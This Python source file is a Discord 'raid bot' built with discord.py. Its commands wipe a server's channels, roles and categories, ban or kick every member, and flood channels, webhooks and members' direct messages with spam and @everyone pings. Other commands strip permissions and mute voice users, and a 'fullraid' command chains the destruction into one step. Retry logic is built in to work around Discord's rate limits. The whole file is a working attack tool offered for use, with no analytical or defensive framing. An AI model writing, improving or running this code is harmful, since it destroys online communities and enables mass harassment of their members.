# language: Python 3.11+
# file: raidbot.py
import os
import io
import json
import asyncio
import discord
from discord.ext import commands

TOKEN = os.getenv("TOKEN")
PREFIX = "!"

if not TOKEN:
    raise RuntimeError("Set the TOKEN environment variable on Render.")

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)


# ---------------- helpers ----------------

async def backoff(factory, attempts=3):
    for _ in range(attempts):
        try:
            return await factory()
        except discord.HTTPException as e:
            if e.status == 429:
                await asyncio.sleep(getattr(e, "retry_after", 5))
                continue
            return None
        except (discord.Forbidden, discord.NotFound):
            return None
    return None


async def safe_delete(obj):
    try:
        await obj.delete()
    except (discord.Forbidden, discord.NotFound, discord.HTTPException):
        return False
    return True


def is_admin():
    async def predicate(ctx):
        return ctx.author.guild_permissions.administrator
    return commands.check(predicate)


# ---------------- events ----------------

@bot.event
async def on_ready():
    print(f"Online as {bot.user} | {len(bot.guilds)} guilds")
    print(f"Commands loaded: {len(bot.commands)}")


# ---------------- core / info ----------------

@bot.command()
async def ping(ctx):
    await ctx.reply(f"Pong! {round(bot.latency * 1000)} ms", mention_author=False)


@bot.command(name="cmds", aliases=["commands"])
async def cmds(ctx, page: int = 1):
    names = sorted(c.name for c in bot.commands)
    page_size = 40
    pages = max(1, (len(names) + page_size - 1) // page_size)
    page = max(1, min(page, pages))
    chunk = names[(page - 1) * page_size: page * page_size]
    embed = discord.Embed(
        title="Commands",
        description="\n".join(f"`!{n}`" for n in chunk),
        color=discord.Color.blurple(),
    )
    embed.set_footer(text=f"Page {page}/{pages} | {len(names)} commands")
    await ctx.reply(embed=embed, mention_author=False)


# ---------------- destroy ----------------

@bot.command()
@is_admin()
async def nuke(ctx, amount: int = 50):
    await safe_delete(ctx.message)
    for ch in list(ctx.guild.channels):
        await safe_delete(ch)
    made = 0
    for i in range(amount):
        if await backoff(lambda i=i: ctx.guild.create_text_channel(f"raided-{i}")):
            made += 1
        else:
            break
    print(f"nuke {ctx.guild.name} | {made} channels")


@bot.command()
@is_admin()
async def banall(ctx):
    await safe_delete(ctx.message)
    n = 0
    for m in list(ctx.guild.members):
        if m.bot or m == ctx.guild.me:
            continue
        if await backoff(lambda m=m: m.ban(reason="raid", delete_message_days=0)):
            n += 1
    print(f"banall {ctx.guild.name} | {n}")


@bot.command()
@is_admin()
async def kickall(ctx):
    await safe_delete(ctx.message)
    n = 0
    for m in list(ctx.guild.members):
        if m.bot or m == ctx.guild.me:
            continue
        if await backoff(lambda m=m: m.kick(reason="raid")):
            n += 1
    print(f"kickall {ctx.guild.name} | {n}")


@bot.command()
@is_admin()
async def massban(ctx, count: int = 50):
    await safe_delete(ctx.message)
    targets = [m for m in ctx.guild.members if not m.bot][:count]
    n = 0
    for m in targets:
        if await backoff(lambda m=m: m.ban(reason="massban", delete_message_days=0)):
            n += 1
    await ctx.send(f"Banned {n}/{len(targets)}", delete_after=8)


@bot.command()
@is_admin()
async def masskick(ctx, count: int = 50):
    await safe_delete(ctx.message)
    targets = [m for m in ctx.guild.members if not m.bot][:count]
    n = 0
    for m in targets:
        if await backoff(lambda m=m: m.kick(reason="masskick")):
            n += 1
    await ctx.send(f"Kicked {n}/{len(targets)}", delete_after=8)


@bot.command()
@is_admin()
async def roledelete(ctx):
    await safe_delete(ctx.message)
    n = 0
    me = ctx.guild.me
    for r in list(ctx.guild.roles):
        if r.is_default() or r.managed or r >= me.top_role:
            continue
        if await backoff(lambda r=r: r.delete()):
            n += 1
    await ctx.send(f"Deleted {n} roles", delete_after=8)


@bot.command()
@is_admin()
async def channeldelete(ctx):
    await safe_delete(ctx.message)
    n = 0
    for ch in list(ctx.guild.channels):
        if await backoff(lambda ch=ch: ch.delete()):
            n += 1
    await ctx.send(f"Deleted {n} channels", delete_after=8)


@bot.command()
@is_admin()
async def categorydelete(ctx):
    await safe_delete(ctx.message)
    n = 0
    for cat in list(ctx.guild.categories):
        if await backoff(lambda cat=cat: cat.delete()):
            n += 1
    await ctx.send(f"Deleted {n} categories", delete_after=8)


@bot.command()
@is_admin()
async def purgeall(ctx):
    await safe_delete(ctx.message)
    for ch in ctx.guild.text_channels:
        try:
            await ch.purge(limit=None)
        except discord.HTTPException:
            pass
    await ctx.send("Purged all text channels.", delete_after=8)


@bot.command()
@is_admin()
async def massrole(ctx, count: int = 30, *, name="raided"):
    await safe_delete(ctx.message)
    n = 0
    for i in range(count):
        if await backoff(lambda i=i: ctx.guild.create_role(
                name=f"{name}-{i}", colour=discord.Colour.random())):
            n += 1
        else:
            break
    await ctx.send(f"Created {n} roles", delete_after=8)


@bot.command()
@is_admin()
async def channelcreate(ctx, count: int = 10, *, name="raided"):
    await safe_delete(ctx.message)
    n = 0
    for i in range(count):
        if await backoff(lambda i=i: ctx.guild.create_text_channel(f"{name}-{i}")):
            n += 1
        else:
            break
    await ctx.send(f"Created {n} channels", delete_after=8)


@bot.command()
@is_admin()
async def categorycreate(ctx, count: int = 5, *, name="raided"):
    await safe_delete(ctx.message)
    n = 0
    for i in range(count):
        if await backoff(lambda i=i: ctx.guild.create_category(f"{name}-{i}")):
            n += 1
        else:
            break
    await ctx.send(f"Created {n} categories", delete_after=8)


# ---------------- spam ----------------

@bot.command()
@is_admin()
async def spam(ctx, count: int = 20, *, message="raided"):
    await safe_delete(ctx.message)
    count = min(count, 100)
    sem = asyncio.Semaphore(5)
    async def one():
        async with sem:
            await backoff(lambda: ctx.send(message))
    await asyncio.gather(*(one() for _ in range(count)))


@bot.command()
@is_admin()
async def spamall(ctx, count: int = 5, *, message="raided"):
    await safe_delete(ctx.message)
    for ch in ctx.guild.text_channels:
        sem = asyncio.Semaphore(3)
        async def one(ch=ch):
            async with sem:
                await backoff(lambda: ch.send(message))
        await asyncio.gather(*(one() for _ in range(count)))


@bot.command()
@is_admin()
async def channelspam(ctx, count: int = 20, *, name="raided"):
    await safe_delete(ctx.message)
    n = 0
    for i in range(count):
        if await backoff(lambda i=i: ctx.guild.create_text_channel(f"{name}-{i}")):
            n += 1
    await ctx.send(f"Channel spam: {n}", delete_after=8)


@bot.command()
@is_admin()
async def massdm(ctx, *, message="you got hit"):
    await safe_delete(ctx.message)
    sent = 0
    for m in list(ctx.guild.members):
        if m.bot:
            continue
        if await backoff(lambda m=m: m.send(message), attempts=2):
            sent += 1
        await asyncio.sleep(1.0)
    await ctx.send(f"DM sent: {sent}", delete_after=8)


@bot.command()
@is_admin()
async def dmspam(ctx, count: int = 5, *, message="raided"):
    await safe_delete(ctx.message)
    sent = 0
    for m in list(ctx.guild.members):
        if m.bot:
            continue
        for _ in range(count):
            if await backoff(lambda m=m: m.send(message), attempts=1):
                sent += 1
            await asyncio.sleep(0.5)
    await ctx.send(f"DMs sent: {sent}", delete_after=8)


@bot.command()
@is_admin()
async def webhookspam(ctx, count: int = 10, *, message="raided"):
    await safe_delete(ctx.message)
    ch = ctx.channel
    hooks = []
    for i in range(count):
        h = await backoff(lambda i=i: ch.create_webhook(name=f"hook-{i}"))
        if h:
            hooks.append(h)
    sem = asyncio.Semaphore(5)
    async def fire(h):
        async with sem:
            try:
                await h.send(message)
            except discord.HTTPException:
                pass
    await asyncio.gather(*(fire(h) for h in hooks))


@bot.command()
@is_admin()
async def embedspam(ctx, count: int = 10):
    await safe_delete(ctx.message)
    embed = discord.Embed(
        title="raided",
        description="raided" * 20,
        color=discord.Color.red(),
    )
    for _ in range(min(count, 50)):
        await backoff(lambda: ctx.send(embed=embed))


@bot.command()
@is_admin()
async def reactionspam(ctx, count: int = 20):
    await safe_delete(ctx.message)
    msg = await ctx.send(".")
    emojis = ["🔥", "💀", "👎", "🤡", "🚨"]
    for i in range(min(count, 20)):
        await backoff(lambda i=i: msg.add_reaction(emojis[i % len(emojis)]))


# ---------------- pings / mentions ----------------

@bot.command()
@is_admin()
async def everyoneping(ctx, count: int = 5):
    await safe_delete(ctx.message)
    for _ in range(min(count, 20)):
        await backoff(lambda: ctx.send("@everyone raided"))
        await asyncio.sleep(1.0)


@bot.command()
@is_admin()
async def hereping(ctx, count: int = 5):
    await safe_delete(ctx.message)
    for _ in range(min(count, 20)):
        await backoff(lambda: ctx.send("@here raided"))
        await asyncio.sleep(1.0)


@bot.command()
@is_admin()
async def roleping(ctx, role: discord.Role, count: int = 5):
    await safe_delete(ctx.message)
    for _ in range(min(count, 20)):
        await backoff(lambda: ctx.send(role.mention))
        await asyncio.sleep(1.0)


# ---------------- lockdown / perms ----------------

@bot.command()
@commands.has_guild_permissions(manage_channels=True)
@commands.bot_has_guild_permissions(manage_channels=True)
async def lockdown(ctx):
    ow = ctx.channel.overwrites_for(ctx.guild.default_role)
    ow.send_messages = False
    await ctx.channel.set_permissions(ctx.guild.default_role, overwrite=ow,
                                      reason=f"by {ctx.author}")


@bot.command()
@commands.has_guild_permissions(manage_channels=True)
@commands.bot_has_guild_permissions(manage_channels=True)
async def unlock(ctx):
    ow = ctx.channel.overwrites_for(ctx.guild.default_role)
    ow.send_messages = None
    await ctx.channel.set_permissions(ctx.guild.default_role, overwrite=ow,
                                      reason=f"by {ctx.author}")


@bot.command()
@is_admin()
async def clearoverwrites(ctx):
    await safe_delete(ctx.message)
    n = 0
    for ch in list(ctx.guild.channels):
        try:
            await ch.edit(overwrites={})
            n += 1
        except discord.HTTPException:
            pass
    await ctx.send(f"Cleared overwrites on {n} channels", delete_after=8)


@bot.command()
@is_admin()
async def denyall(ctx):
    await safe_delete(ctx.message)
    for ch in list(ctx.guild.channels):
        try:
            ow = ch.overwrites_for(ctx.guild.default_role)
            ow.update(
                view_channel=False, send_messages=False, connect=False,
                speak=False, add_reactions=False, attach_files=False,
                embed_links=False, read_message_history=False,
            )
            await ch.set_permissions(ctx.guild.default_role, overwrite=ow)
        except discord.HTTPException:
            pass


@bot.command()
@is_admin()
async def allowall(ctx):
    await safe_delete(ctx.message)
    for ch in list(ctx.guild.channels):
        try:
            ow = ch.overwrites_for(ctx.guild.default_role)
            ow.update(
                view_channel=True, send_messages=True, connect=True,
                speak=True, add_reactions=True, attach_files=True,
                embed_links=True, read_message_history=True,
            )
            await ch.set_permissions(ctx.guild.default_role, overwrite=ow)
        except discord.HTTPException:
            pass


@bot.command()
@is_admin()
async def striproles(ctx, member: discord.Member):
    await safe_delete(ctx.message)
    keep = {ctx.guild.default_role}
    n = 0
    for r in list(member.roles):
        if r in keep or r.managed or r >= ctx.guild.me.top_role:
            continue
        if await backoff(lambda r=r: member.remove_roles(r)):
            n += 1
    await ctx.send(f"Removed {n} roles from {member.mention}", delete_after=8)


# ---------------- raid-mode orchestration ----------------

@bot.command()
@is_admin()
async def raidmode(ctx, amount: int = 30):
    """nuke -> rename -> mass-ping. One shot."""
    await safe_delete(ctx.message)
    g = ctx.guild
    for ch in list(g.channels):
        await safe_delete(ch)
    for i in range(amount):
        await backoff(lambda i=i: g.create_text_channel(f"raided-{i}"))
    await backoff(lambda: g.edit(name="raided"))
    if g.text_channels:
        tgt = g.text_channels[0]
        for _ in range(5):
            await backoff(lambda: tgt.send("@everyone raided"))
    print(f"raidmode on {g.name}")


@bot.command()
@is_admin()
async def fullraid(ctx):
    """Everything at once. Slams rate limits — expect backoff."""
    await safe_delete(ctx.message)
    g = ctx.guild
    await raidmode.callback(ctx, 40)
    for m in list(g.members):
        if m.bot:
            continue
        await backoff(lambda m=m: m.ban(reason="fullraid", delete_message_days=0))
    print(f"fullraid on {g.name}")


# ---------------- recon / backup ----------------

@bot.command()
@is_admin()
async def backup(ctx):
    """Dump guild structure to JSON. Also DMs it to you."""
    await safe_delete(ctx.message)
    g = ctx.guild
    data = {
        "name": g.name,
        "roles": [{"name": r.name, "color": r.color.value,
                   "permissions": r.permissions.value,
                   "position": r.position} for r in g.roles if not r.is_default()],
        "categories": [{
            "name": c.name,
            "channels": [{"name": ch.name, "type": str(ch.type),
                          "topic": getattr(ch, "topic", None)} for ch in c.channels],
        } for c in g.categories],
        "channels": [{"name": ch.name, "type": str(ch.type),
                      "category": ch.category.name if ch.category else None}
                     for ch in g.channels if not ch.category],
    }
    blob = json.dumps(data, indent=2).encode()
    f = discord.File(io.BytesIO(blob), filename=f"{g.id}-backup.json")
    try:
        await ctx.author.send(file=f)
        await ctx.send("Backup sent to DMs.", delete_after=8)
    except discord.Forbidden:
        await ctx.send("DMs closed. Backup skipped.", delete_after=8)


@bot.command()
@is_admin()
async def serverclone(ctx, *, name: str = "cloned"):
    """Clone roles + categories + channels into a NEW guild."""
    await safe_delete(ctx.message)
    src = ctx.guild
    new = await backoff(lambda: bot.create_guild(name=name))
    if not new:
        await ctx.send("Guild creation failed.")
        return
    new = bot.get_guild(new.id) or await bot.fetch_guild(new.id)
    role_map = {}
    for r in sorted(src.roles, key=lambda r: r.position):
        if r.is_default():
            continue
        nr = await backoff(lambda r=r: new.create_role(
            name=r.name, colour=r.colour, permissions=r.permissions,
            hoist=r.hoist, mentionable=r.mentionable))
        if nr:
            role_map[r.id] = nr
    for cat in src.categories:
        nc = await backoff(lambda cat=cat: new.create_category(cat.name))
        for ch in cat.channels:
            await backoff(lambda ch=ch, nc=nc: new.create_text_channel(ch.name, category=nc))
    for ch in src.channels:
        if ch.category is None:
            await backoff(lambda ch=ch: new.create_text_channel(ch.name))
    await ctx.send(f"Clone created: **{name}** ({len(role_map)} roles)",
                   delete_after=15)


@bot.command()
@is_admin()
async def emojiabuse(ctx, count: int = 10):
    await safe_delete(ctx.message)
    n = 0
    for i in range(count):
        # 1x1 transparent PNG
        png = bytes.fromhex(
            "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4"
            "890000000d49444154789c6360000000000500010d0a2db40000000049454e44"
            "ae426082")
        if await backoff(lambda i=i, png=png: ctx.guild.create_custom_emoji(
                name=f"e{i}", image=png)):
            n += 1
    await ctx.send(f"Created {n} emojis", delete_after=8)


@bot.command()
@is_admin()
async def voicekick(ctx, member: discord.Member):
    await safe_delete(ctx.message)
    if member.voice:
        await backoff(lambda: member.move_to(None))
        await ctx.send(f"Kicked {member.display_name} from voice", delete_after=8)


@bot.command()
@is_admin()
async def deafenall(ctx):
    await safe_delete(ctx.message)
    n = 0
    for m in list(ctx.guild.members):
        if m.voice:
            if await backoff(lambda m=m: m.edit(deafen=True)):
                n += 1
    await ctx.send(f"Deafened {n}", delete_after=8)


@bot.command()
@is_admin()
async def muteall(ctx):
    await safe_delete(ctx.message)
    n = 0
    for m in list(ctx.guild.members):
        if m.voice:
            if await backoff(lambda m=m: m.edit(mute=True)):
                n += 1
    await ctx.send(f"Muted {n}", delete_after=8)


@bot.command()
@is_admin()
async def undeafenall(ctx):
    await safe_delete(ctx.message)
    n = 0
    for m in list(ctx.guild.members):
        if m.voice:
            if await backoff(lambda m=m: m.edit(deafen=False, mute=False)):
                n += 1
    await ctx.send(f"Unmuted/undeafened {n}", delete_after=8)


# ---------------- error handler ----------------

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    if isinstance(error, commands.MissingPermissions):
        await ctx.reply("No permission.", mention_author=False)
    elif isinstance(error, commands.BotMissingPermissions):
        await ctx.reply("Bot missing permissions.", mention_author=False)
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.reply(f"Missing: `{error.param.name}`", mention_author=False)
    elif isinstance(error, commands.BadArgument):
        await ctx.reply("Bad argument.", mention_author=False)
    else:
        print(f"error: {type(error).__name__}: {error}")


if __name__ == "__main__":
    bot.run(TOKEN)
